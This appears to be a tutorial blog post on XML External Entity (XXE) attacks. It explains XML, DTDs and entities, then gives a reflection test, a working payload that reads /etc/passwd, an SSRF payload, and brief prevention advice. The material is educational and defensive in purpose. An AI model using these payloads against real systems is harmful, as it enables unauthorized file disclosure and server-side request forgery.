---
title: "XML External Entity - XXE Attack"
date: 2023-07-01
draft: false
tags: 
  - xml
  - xxe
  - cybersecurity
  - infosec
categories:
  - cybersecurity
  - infosec
cover: 
  image: "/xxe.png"
---
XXE is a web-based vulnerability that enables an adversary to interfere with XML data processes in a web application. An XXE attack can be carried out by exploiting the way in which XML parses data.

An XXE attack can lead to - denial of service (DoS), server-side request forgery (SSRF), local file inclusion (LFI), directory traversal, remote code execution (RCE), network port scanning.

There are two types of XXE attacks: 

**in-band** - attacker receives an immediate response to the XXE payload

**out-of-band (OOB-XXE)/blind XXE** - there is no immediate response from the web application

### What is XML

Extensible Markup Language (XML) is a markup language that provides rules to define any data.

XML has no predefined tags to use; instead, you can define your own tags designed specifically for your needs

XML has a standardized syntax - this makes it easier to transmit XML across systems or platforms, either locally or over the internet, the recipient can still parse using XML parsers

### What are XML parsers

Convert XML data from its serialized string format to its hierarchical format.

### Format of XML aka Syntax

**XML prolog** - defines the XML version and the encoding used in the XML document.

`<?xml version = "1.0" encoding = "utf-8"?>`

It is optional, however when we include it in the XML document, it should always be the first line of the document. 

**XML document structure**

```xml
<?xml version = "1.0" encoding = "utf-8"?>
<root>  
	<child>  
		<subchild>.....</subchild>  
	</child>  
</root>
```

A XML document **should always have a root element**

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<Movies>
    <Type>Action</Type>
    <movie>
        <No>1</No>
        <Name>IronMan</Name>
    </movie>
    <movie>
        <No>2</No>
        <Name>Mission Impossible</Name>
    </movie>
    <movie>
        <No>3</No>
        <Name>The Bourne Identity</Name>
    </movie>
</Movies>
```

### DTD in XML

The purpose of a Document Type Definition (DTD) is to define the legal building blocks of an XML document. It defines the document structure with a list of legal elements. A DTD can be declared inline in your XML document, or as an external reference. 

This is an XML document with a Document Type Definition:

***Internal DTD***

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note    (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>

<note>
  <to>Susan</to>
  <from>David</from>
  <heading>Reminder</heading>
  <body>Meeting at 9</body>
</note>
```

***External DTD***

```xml
<?xml version="1.0"?>
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

### Entities

Entities are "shortcuts" to common text and can be defined internally or externally.

***Internal Entity Declaration***

```xml
Syntax: 

<!ENTITY entity-name "entity-value">

DTD Example:

<!ENTITY writer "Jan Egil Refsnes.">
<!ENTITY copyright "Copyright XML101.">

XML example:

<author>&writer;&copyright;</author>
```

> For XXE attacks to be possible
> 
> - Web app must accept XML input from the user and parse it using a back-end XML parser
> - The XML parser must have XML external entities support enabled

### How to check for XXE
##### XXE Entity Example

```xml
<?xml version="1.0"?><!DOCTYPE Any [<!ENTITY xxe "testdata">]><add>&xxe;</add>
```

If "testdata" gets reflected then it is vulnerable to XXE.

### To exploit

##### Disclosing /etc/passwd 

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<root>&xxe;</root>
```

The above payload would display the content of the file `/etc/passwd`

> XXE can only be used to obtain files or responses that contain “valid” XML
> XXE cannot be used to obtain binary files


##### XXE SSRF ( Server Side Request Forgery ) Example

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [  
<!ELEMENT foo (#ANY)>
<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>
```


### How to prevent XXE?

- input validation and sanitization of XML documents
- create whitelists and blacklists for XML content
- disallow XML external entities on the level of the XML parser, not the web application

### Further Read

SVG file upload leads to XXE: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

XML External Entity (XXE) Injection Payload List: https://github.com/payloadbox/xxe-injection-payload-list